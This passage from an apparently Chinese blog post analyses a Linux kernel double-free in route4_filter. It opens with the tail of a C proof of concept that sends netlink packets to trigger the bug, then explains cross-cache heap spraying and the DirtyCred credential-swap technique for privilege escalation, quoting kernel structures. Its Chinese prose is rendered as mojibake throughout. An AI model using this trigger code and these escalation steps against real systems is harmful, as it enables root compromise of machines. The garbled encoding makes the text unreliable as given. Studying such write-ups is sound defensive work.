class="string">&quot;socket:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s: %d\n&quot;</span>,s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;newlink:\n&quot;</span>);</span><br><span class="line">        hexdump(newlink,<span class="number">0x100</span>);</span><br><span class="line">        write(s, newlink, <span class="keyword">sizeof</span>(newlink));</span><br><span class="line">        read(s, buf2, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        perror(<span class="string">&quot;NLMSG_ERROR&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;msg type:%d\n&quot;</span>,*(<span class="keyword">short</span> *)(buf + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;qdisc:\n&quot;</span>);</span><br><span class="line">        hexdump(buf,<span class="number">0x100</span>);</span><br><span class="line">        write(s, buf, tlen);</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(tfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, tfilter, <span class="keyword">sizeof</span>(tfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ntfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(ntfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, ntfilter, <span class="keyword">sizeof</span>(ntfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dellink:\n&quot;</span>);</span><br><span class="line">        hexdump(dellink,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, dellink, <span class="keyword">sizeof</span>(dellink));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pocå†™çš„æ¯”è¾ƒæ¸…æ™°çš„ï¼Œé¦–å…ˆæ˜¯<code>socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</code>,ç„¶åå‘äº†äº”æ¬¡åŒ…ï¼Œç¬¬ä¸€ç¬¬äºŒæ¬¡å¥½ä¼¼æ˜¯è®¾ç½®ç½‘ç»œè®¾å¤‡çš„ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯ç¬¬ä¸‰ç¬¬å››å’Œå››äº”æ¬¡å‘åŒ…ï¼Œç¬¬ä¸‰æ¬¡å‘åŒ…æ˜¯åˆ›å»ºäº†ä¸€ä¸ª<code>handle</code>ä¸º0çš„<code>route4_filter</code>ï¼Œç¬¬å››æ¬¡å‘åŒ…è¿˜æ˜¯ä¼ å…¥ä¸€ä¸ª<code>handle</code>ä¸º0çš„<code>route4_filer</code>ï¼Œè¿™æ ·ç¬¬ä¸€æ¬¡åˆ›å»ºçš„<code>route4_filer</code>å°±è¢«é‡Šæ”¾å½“æ—¶æ²¡æœ‰è„±é“¾ï¼Œç„¶åç¬¬äº”æ¬¡å‘åŒ…æ˜¯åˆ é™¤ç¬¬ä¸€æ¬¡å‘åŒ…åˆ›å»ºçš„<code>link</code>,è¿™æ ·å°±é¡ºå¸¦ç€æŠŠä»–çš„<code>route4_filer</code>ä¹Ÿç»™freeæ‰äº†ï¼Œè¿™æ ·å°±æ„æˆäº†ä¸€ä¸ª<code>doublefree</code>äº†ã€‚è€Œä¸”ä¸æ­¢doubelfreeäº†<code>route4_filter</code>ï¼Œè¿˜doublefreeäº†ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œå‰ä¸€ä¸ªçš„objçš„sizeä¸º<code>kmalloc-192</code>,åä¸€ä¸ªæ˜¯<code>kmalloc-256</code></p>
<p>è§¦å‘äº†doublefreeä½†æ˜¯å†…æ ¸å¹¶æ²¡æœ‰ç›´æ¥å´©æºƒã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221201205500293.png" alt="image-20221201205500293"></p>
<h3 id="æ¼æ´åˆ©ç”¨åŸç†"><a href="#æ¼æ´åˆ©ç”¨åŸç†" class="headerlink" title="æ¼æ´åˆ©ç”¨åŸç†"></a>æ¼æ´åˆ©ç”¨åŸç†</h3><p>æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¼æ´åˆ©ç”¨ä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯<code>cross cache attack</code>å’Œ<code>dirty cred</code>ï¼Œä¸‹é¢åˆ†åˆ«å°±è¿™ä¸¤ç‚¹è¯¦ç»†å±•å¼€å­¦ä¹ ã€‚</p>
<h4 id="cross-cache-attack"><a href="#cross-cache-attack" class="headerlink" title="cross cache attack"></a>cross cache attack</h4><p>ä»–çš„ä¸»è¦ä½œç”¨å°±æ˜¯ç»•è¿‡å†…æ ¸çš„slabéš”ç¦»ã€‚åœ¨æ²¡æœ‰çœ‹n1ctfé‚£é“å†…æ ¸é¢˜ç›®ä¹‹å‰è¿˜ä¸æ˜¯èƒ½å®Œå…¨ç†è§£è¿™ç§æ”»å‡»æ€è·¯çš„å¼ºå¤§ï¼Œç°åœ¨å†æ¥çœ‹çš„æ˜¯å‘ç°ç®€ç›´å¥½ç”¨çš„ä¸€ã€‚</p>
<p>å†…æ ¸æ˜¯ä»<code>kmem_cahches</code>ä¸­ç”³è¯·ä¸åŒå¤§å°çš„objçš„ï¼Œè€Œ<code>keme_caches</code>å³<code>kmalloc slab allocation</code>åˆ™æ˜¯åŸºäº<code>buddy allocator</code>çš„ï¼Œ<code>buddy allocator</code>å°±æ˜¯ä¼™ä¼´ç³»ç»Ÿï¼Œå½“kmalloc cacheä¸Šæ²¡æœ‰è¶³å¤Ÿçš„objçš„æ—¶å€™ï¼Œå°±ä¼šå‘buddy allocatorç”³è¯·<code>order-n page</code>,å…·ä½“ä¼šè°ƒç”¨ <code>new_slab()</code> -&gt; <code>allocate_slab()</code> -&gt; <code>alloc_slab_page()</code> å‘ buddy allocator ç”³è¯·é¡µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab allocation and freeing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);      <span class="comment">// order = kmem_cache-&gt;oo.x &gt;&gt; 16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">        folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!folio)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    slab = folio_slab(folio);</span><br><span class="line">    __folio_set_slab(folio);</span><br><span class="line">    <span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">        slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­order-nä¸­çš„nåˆ°åº•æ˜¯å¤šå°‘å°±çœ‹è¿™ä¸ªslabçš„ç±»å‹äº†ï¼Œå¯ä»¥é€šè¿‡<code>cat /proc/slabinfo</code>å¿«é€ŸçŸ¥é“,æˆ‘æŸ¥çœ‹æˆ‘è‡ªå·±ubuntu16çš„credçš„slab,å‘ç°è¦è¦æ˜¯ç”¨ä¼™ä¼´ç³»ç»Ÿä¸­çš„<code>order-2</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€æ¬¡å‘ä¼™ä¼´ç³»ç»Ÿä¸­ç›´æ¥ç”³è¯·ä¸¤ä¸ªè¿ç»­çš„é¡µé¢ç”¨äºcredçš„slabã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ sudo cat /proc/slabinfo | grep cred</span><br><span class="line">cred_jar            8316   8316    192   42    2 : tunables    0    0    0 : slabdata    198    198      0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>buddy allocator ä¸ºæ¯ä¸ª order-n page ä¿å­˜ç€ä¸€ä¸ª FIFO queue æ•°ç»„ï¼Œorder-n page è¡¨ç¤º 2^nä¸ªè¿ç»­é¡µçš„å†…å­˜ã€‚å½“ä½ é‡Šæ”¾chunkåå¯¼è‡´slabå…¨éƒ¨ç©ºé—²æ—¶ï¼Œslab allocator å°±ä¼šå°†é¡µè¿˜ç»™ buddy allocatorã€‚</li>
<li>slabå¯¹åº”çš„orderç”±å¾ˆå¤šå› ç´ å†³å®šï¼Œå¦‚ slab chunk å¤§å°ã€ç³»ç»Ÿå®šä¹‰ã€å†…æ ¸ç¼–è¯‘ç­‰ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯æŸ¥çœ‹ <code>/proc/slabinfo</code>ã€‚</li>
<li>å¦‚æœæ‰€ç”³è¯·çš„ order-n page é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™å°† order-n+1 çš„é¡µä¸€åˆ†ä¸ºäºŒï¼Œä¸€åŠè¿”å›ç»™ç”³è¯·è€…ï¼Œä¸€åŠä¿å­˜åœ¨ order-n ä¸­ï¼›å¦‚æœ1ä¸ªpageè¿”å›ç»™ buddy allocatorï¼Œä¸”å…¶å¯¹åº”çš„ buddy page ä¹Ÿåœ¨åŒä¸€é˜Ÿåˆ—ä¸­ï¼Œåˆ™æ•´åˆåæ”¾åœ¨ä¸‹ä¸€orderçš„pageé˜Ÿåˆ—ä¸­ã€‚</li>
</ul>
<p>cross cache attackåŸç†æ”»å‡»çš„æ•´ä½“æ€è·¯æ˜¯ï¼Œå½“ä¸€ä¸ªslab é¡µé¢è¢«å…¨éƒ¨é‡Šæ”¾çš„æ—¶å€™ä¼šè¢«å›æ”¶ï¼Œè¿™æ—¶è¢«å›æ”¶çš„é¡µé¢æ˜¯å¯ä»¥è¢«å…¶ä»–ç§ç±»çš„slabä½¿ç”¨çš„è¿™æ ·å°±å¯ä»¥è·¨slabç§ç±»æ¥è¿›è¡Œåˆ©ç”¨ï¼Œå¦‚Zhenpeng Lin çš„pptä¸­æ¼”ç¤ºçš„ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/a2523bab1dc14ef6815c3dffd48f9c30.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å‡å®šæˆ‘ä»¬æœ‰ä¸€ä¸ªéæ³•é‡Šæ”¾æ¼æ´(æˆ–double free)ï¼Œä½†åªèƒ½é‡Šæ”¾æ™®é€šslab ä¸­çš„å †å—ï¼š</p>
<ul>
<li>1.é¦–å…ˆå–·å°„ä¸€å †è¯¥å¤§å°çš„æ™®é€šå †å—ï¼Œè¿™æ ·ä¼šæ¶ˆè€—ä¸€å¤§å †slab é¡µé¢ã€‚æˆ‘ä»¬çš„double freeç›®æ ‡æŒ‡é’ˆæŒ‡å‘å…¶ä¸­ä¸€ä¸ªå †å—ï¼Œå…ˆå°†å…¶é‡Šæ”¾</li>
<li>2.ç„¶åå°†å–·å°„çš„ä¸€å¤§å †æ™®é€šå †å—éƒ½é‡Šæ”¾æ‰ï¼Œè¿™æ ·double freeç›®æ ‡å †å—æ‰€åœ¨slab é¡µé¢ä¸­çš„æ‰€æœ‰å †å—(ç»å¤§æ¦‚ç‡)ä¼šè¢«éƒ½é‡Šæ”¾æ‰ï¼Œè¯¥slab é¡µé¢ä¸ºç©ºï¼Œä¼šè¢«ç³»ç»Ÿå›æ”¶</li>
<li>3.è¿™æ—¶å–·å°„ä¸€å¤§å †filp / å…¶ä»–slab ç±»å‹çš„å †å—ï¼Œè¿™æ ·ç›®æ ‡æŒ‡é’ˆæ‰€åœ¨é¡µé¢å¤§æ¦‚ç‡ä¼šè¢«filp ç±»å‹slabæˆ–å…¶ä»–ç›®æ ‡ç±»å‹slabé‡æ–°ç”³è¯·åˆ°å—ï¼Œå¹¶ä¸”ç›®æ ‡æŒ‡é’ˆ(double freeæ¼æ´æŒ‡é’ˆ)æŒ‡å‘å…¶ä¸­ä¸€ä¸ªstruct fileç»“æ„ä½“</li>
<li>4.ä½¿ç”¨æ¼æ´çš„ç¬¬äºŒæ¬¡é‡Šæ”¾èƒ½åŠ›ï¼Œè¯¥struct fileç»“æ„ä½“è¢«éæ³•é‡Šæ”¾</li>
</ul>
<h4 id="dirty-cred"><a href="#dirty-cred" class="headerlink" title="dirty cred"></a>dirty cred</h4><h5 id="struct-file"><a href="#struct-file" class="headerlink" title="struct file"></a>struct file</h5><p>å¾ˆæœ‰æ„æ€çš„ä¸€ä¸ªæ”»å‡»æ€è·¯ã€‚ä¸»è¦çš„æ€è·¯å°±æ˜¯åˆ©ç”¨é«˜å‡­è¯æ›¿æ¢ä½å‡­è¯ã€‚è€Œå‡­è¯ä¸€èˆ¬å°±æ˜¯<code>cred</code>å’Œ<code>file</code>,ä¸‹é¢ä¸»è¦æ¢è®¨åœ¨<code>doublefree</code>æƒ…å†µä¸‹å¦‚ä½•è¿›è¡Œå‡­è¯æ›¿æ¢ã€‚</p>
<p>fileç»“æ„ä½“æ˜¯æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶å°±ä¼šåˆ›å»ºçš„ä¸€ä¸ªç»“æ„ä½“ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode; <span class="comment">//è¯»å†™æƒé™</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯ä»‹ç»<code>dirty cred</code>çš„è®ºæ–‡ä¸­æåˆ°çš„doublefreeæƒ…å†µä¸‹çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†æˆ‘è§‰å¾—å…¶å®æ²¡å¿…è¦è¿™ä¹ˆéº»çƒ¦çš„ï¼Œå¦‚æœåªæ˜¯é«˜å‡­è¯æ›¿æ¢ä½å‡­è¯çš„è¯ï¼Œå‡å¦‚<code>ptr1</code>æ‹¥æœ‰doublefree,é‚£å…ˆæŠŠptr1ç»™freeä¸€æ¬¡ï¼Œç„¶åè®©ä½å‡­è¯ç”³è¯·åˆ°è¿™ä¸ªobj,å°±è®°ä½œptr2,ç„¶åå†freeä¸€æ¬¡ptr1,å°±æŠŠä½å‡­è¯ä¹Ÿç»™freeæ‰äº†ï¼Œæ¥ç€å†å †å–·ä½å‡­è¯,å†æ¬¡ç”³è¯·åˆ°ptr2æŒ‡å‘çš„å†…å­˜ï¼Œè®°ä½œptr3,è¿™æ ·ptr2å’Œptr3å°±æŒ‡å‘äº†æ¡¶ä¸€å—ä½å‡­è¯<code>struct file</code>äº†ï¼Œç„¶åé€šè¿‡ç³»ç»Ÿè°ƒç”¨<code>kcmp</code>æ¥å¾—çŸ¥<code>ptr2</code>å’Œ<code>ptr3</code>æŒ‡å‘åŒä¸€ä¸ª<code>struct file</code>(å› ä¸ºæ˜¯å †å–·)ï¼Œç„¶åé‡Šæ”¾ä½å‡­è¯çš„<code>struct file</code>å°±èƒ½æ›¿æ¢æˆé«˜å‡­è¯äº†ã€‚</p>
<p>å“¦æˆ‘æ‡‚äº†ï¼Œä¸‹é¢çš„æ–¹æ³•å…¶å®æ›´åŠ é€šç”¨ï¼Œå› ä¸ºå¦‚æœèƒ½<code>doublefree</code>çš„è¯å¯èƒ½objçš„å¤§å°ä¸ç­‰äº<code>struct file</code>çš„å¤§å°ï¼Œæ‰€ä»¥å¯èƒ½å‡ºç°ä¸å¯¹é½çš„ç°è±¡ï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ªptræŒ‡å‘åŒä¸€ä¸ªobjäº†ã€‚ä¸Šè¿°æ–¹æ³•åªé€‚ç”¨äºåˆšå¥½å¯¹é½ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼šä¸€èˆ¬ Double-Free å‘ç”Ÿåœ¨é€šç”¨cacheä¸­ï¼Œè€Œå†…æ ¸å‡­è¯ä½äº dedicated cache ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œ cross-cache å†…å­˜å¸ƒå±€ã€‚å†…æ ¸ä¼šå›æ”¶æœªä½¿ç”¨çš„å†…å­˜é¡µï¼Œç„¶ååˆ†é…ç»™å…¶ä»–éœ€è¦æ›´å¤šç©ºé—´çš„cacheã€‚</p>
<ul>
<li><code>a-d</code>ï¼šä¸¤æ¬¡è§¦å‘DFï¼Œè·å¾—2ä¸ªæŒ‡å‘åŒä¸€æ¼æ´å¯¹è±¡çš„æ‚¬å‚æŒ‡é’ˆï¼ˆ<code>ptr1&#39;</code> / <code>ptr2&#39;</code>ï¼‰ï¼›</li>
<li><code>e</code>ï¼šå°†è¯¥é€šç”¨cacheçš„å†…å­˜é¡µå…¨éƒ¨é‡Šæ”¾å½’è¿˜ç»™é¡µç®¡ç†å™¨ï¼Œè¿™æ ·è¯¥å†…å­˜é¡µå°±å¯ä»¥åˆ†é…ç»™ <code>dedicated cache</code> ï¼ˆå­˜æ”¾å‡­è¯å¯¹è±¡ï¼‰ï¼›</li>
<li><code>f</code>ï¼šåˆ†é…å¤§é‡å‡­è¯å¯¹è±¡ï¼ˆç‰¹æ®Šcacheï¼‰å æ®æ¼æ´å¯¹è±¡å¯¹åº”çš„ç©ºé—²å—ï¼Œç°åœ¨æœ‰3ä¸ªæŒ‡é’ˆæŒ‡å‘è¯¥å†…å­˜å—äº†ï¼ˆ2ä¸ªæ‚¬å‚æŒ‡é’ˆå’Œä¸€ä¸ªvictimå¯¹è±¡ä¸­çš„å‡­è¯æŒ‡é’ˆï¼Œæ‚¬å‚æŒ‡é’ˆå¯èƒ½æœªå¯¹é½ï¼ŒæŒ‡å‘å‡­è¯å¯¹è±¡çš„å†…éƒ¨ï¼‰ï¼›</li>
<li><code>g</code>ï¼šåˆ©ç”¨å…¶ä¸­1ä¸ªæ‚¬å‚æŒ‡é’ˆï¼ˆ<code>ptr2&#39;</code>ï¼‰é‡Šæ”¾å‡­è¯å¯¹è±¡ï¼Œåˆ›é€ ç©ºæ´ï¼›</li>
<li><code>h</code>ï¼šåˆ†é…æ–°çš„ä½æƒé™å‡­è¯å¯¹è±¡å æ®è¯¥ä½ç½®ï¼›</li>
<li>å‰©ä½™1ä¸ªæ‚¬å‚æŒ‡é’ˆï¼ˆ<code>ptr1&#39;</code>ï¼‰æŒ‡å‘ä½æƒé™å‡­è¯å¯¹è±¡ï¼Œå†æ¬¡é‡Šæ”¾åå°±èƒ½ç”¨é«˜æƒé™å‡­è¯å¯¹è±¡æ›¿æ¢ä½æƒé™å‡­è¯å¯¹è±¡äº†ã€‚</li>
</ul>
<p><img src="https://pic4.zhimg.com/80/v2-69fe299aa60f25a13d7977bf3bbc8763_720w.webp" alt="img"></p>
<p>åˆ°ç›®å‰ä¸ºæ­¢å·²ç»èƒ½å‡­è¯æ›¿æ¢äº†ï¼Œç°åœ¨å°±å¾—åˆ©ç”¨å‡­è¯æ›¿æ¢æ¥å®Œæˆå¯¹ä¸å¯å†™æ–‡ä»¶çš„å†™å…¥äº†ï¼Œåœ¨è€ç‰ˆæœ¬4.13ä»¥å‰ä½¿ç”¨<code>writev</code>å‘æŸä¸ªæ–‡ä»¶ä¸­å†™å…¥å†…å®¹æ—¶é€»è¾‘æ—¶è¿™æ ·çš„</p>
<ol>
<li>è¿›è¡Œè®¿é—®æƒé™æ ¡éªŒ(æ˜¯å¦å¯å†™)</li>
<li>ä»ç”¨æˆ·ç©ºé—´è·å–å†™å…¥å†…å®¹</li>
<li>å®é™…å†™å…¥æ“ä½œ</li>
</ol>
<p>å¯ä»¥çœ‹å‡ºåœ¨éªŒè¯å®Œæƒé™å’Œå®é™…å†™å…¥æ“ä½œä¹‹é—´è¿˜æœ‰ä¸€æ­¥æ“ä½œï¼Œè¿™å°±å¯ä»¥å½¢æˆæ¡ä»¶ç«äº‰äº†ï¼Œåªè¦éªŒè¯å®Œå¯å†™æƒé™ä¹‹åå°±é€šè¿‡å µå¡å¡åœ¨ç¬¬äºŒæ­¥ï¼Œç„¶åæ›¿æ¢æˆé«˜å‡­è¯ã€‚å†å†™å…¥çš„æ—¶å€™å°±å¾€ä¸å¯å†™æ–‡ä»¶é‡Œå†™å…¥å†…å®¹äº†ã€‚</p>
<p>dæŒ‰æ—¶è¿™ç§åŠæ³•å·²ç»æ˜¯æ˜¨æ—¥é»„èŠ±äº†ï¼Œåœ¨4.13ç‰ˆæœ¬ä»¥åwritevçš„é€»è¾‘å°±æˆè¿™æ ·äº†</p>
<ol>
<li>ä»ç”¨æˆ·ç©ºé—´è·å–å†™å…¥å†…å®¹</li>
<li>è¿›è¡Œè®¿é—®æƒé™æ ¡éªŒ(æ˜¯å¦å¯å†™)</li>
<li>å®é™…å†™å…¥æ“ä½œ</li>
</ol>
<p>æ‰€ä»¥åœ¨æ–°ç‰ˆæœ¬å°±æ²¡åŠæ³•åˆ©ç”¨è€åŠæ³•å µå¡å¢å¤§æ—¶é—´çª—(ä»æ£€æŸ¥æƒé™åˆ°çœŸæ­£æ“ä½œä¹‹é—´çš„æ—¶é—´)äº†ã€‚ä½†æ˜¯å¢å¤§æ—¶é—´çª—è¿˜æ˜¯æœ‰çš„ï¼Œè¿™å°±åˆ©ç”¨äº†æ–‡ä»¶çš„innodeé”äº†ã€‚</p>
<p>åœ¨å·²ç»æœ‰ä¸€ä¸ªè¿›ç¨‹å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œçš„æ—¶å€™ï¼Œä¼šç»™æ–‡ä»¶inodeä¸Šé”ï¼Œå…¶ä»–å‘è¯¥æ–‡ä»¶è¿›è¡Œå†™å…¥çš„è¿›ç¨‹éœ€è¦ç­‰å¾…ä¸Šä¸€ä¸ªè¿›ç¨‹å†™å…¥å®Œæˆè§£é”ã€‚æ‰€ä»¥å°±å¯ä»¥æœ‰è¿™æ ·çš„åˆ©ç”¨äº†,è¿™æ ·åŒæ ·å¯ä»¥å¢å¤§æ—¶é—´çª—ã€‚</p>
<ol>
